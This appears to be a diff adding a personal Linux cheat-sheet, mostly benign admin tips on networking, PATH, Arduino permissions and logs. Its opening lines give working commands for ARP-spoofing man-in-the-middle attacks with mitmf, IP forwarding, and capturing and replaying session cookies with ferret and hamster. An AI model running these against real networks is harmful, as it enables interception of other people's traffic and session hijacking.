@@ -1,0 +1,37 @@
+-To get the windows product key execute with admin privileges: wmic path softwarelicensingservice get OA3xOriginalProductKey
+
+-Use mitmf or ettercap to start mitm then use ferret to capture cookies (ferret -i eth0)
+  use hamster to set session cookies and then in browser set the proxy settings to manual giving the address
+  provided by hamster and finally open that link
+
+-Example usage of mitmf: sudo mitmf --arp --spoof --gateway 192.168.1.1 --target 192.168.1.10 -i wlan0
+
+-IP forwarding: "https://wiki.archlinux.org/index.php/Internet_sharing_(Italiano)" more precisely:
+    "echo 1 > /proc/sys/net/ipv4/ip_forward" thank me later
+
+-To restart network interfaces: "ifdown <interface>" "ifup <interface>" "/etc/init.d/networking restart"
+    (tested working on Ubuntu server and Debian)
+
+-If airmon-ng doesn't work use "ifconfig <inerface> down" then "iwconfig <interface> mode monitor" and finally
+  "ifconfig <interface> up"
+
+-To note that "iwconfig" and "ifconfig" are basically equivalent, iwconfig can be used as "iwconfig <interface>"
+  to mask just one interface and it gives more information like the status and mode (managed, monitor)
+
+-To fix arduino permissions "ls -la /dev/tty*" and see which group TTYs are in, then add yourself to that group:
+  "usermod -a -G examplegroup exampleusername" source in: https://www.howtogeek.com/50787/add-a-user-to-a-group-or-second-group-on-linux/
+  or just use "$USER" to add current user
+
+-Who are you? "whoami"
+
+-Where am I? "groups"
+
+-To add executables you have to add them to your $PATH, example: "export PATH="$PATH:$HOME/esp/xtensa-esp32-elf/bin"
+  "https://askubuntu.com/questions/322772/how-do-i-add-an-executable-to-my-search-path"
+  or from "https://unix.stackexchange.com/questions/3809/how-can-i-make-a-program-executable-from-everywhere"
+  quote "If you just type export PATH=$PATH:</path/to/file> at the command line it will only last for the length of the session.
+  If you want to change it permanently add export PATH=$PATH:</path/to/file> (the bin/ folder) to your ~/.bashrc file (just at the end is fine)."
+
+-To check system logs use "journalctl" (you must have systemctl), some guides:
+  https://wiki.archlinux.org/index.php/Systemd#Journal
+  https://www.digitalocean.com/community/tutorials/how-to-use-journalctl-to-view-and-manipulate-systemd-logs
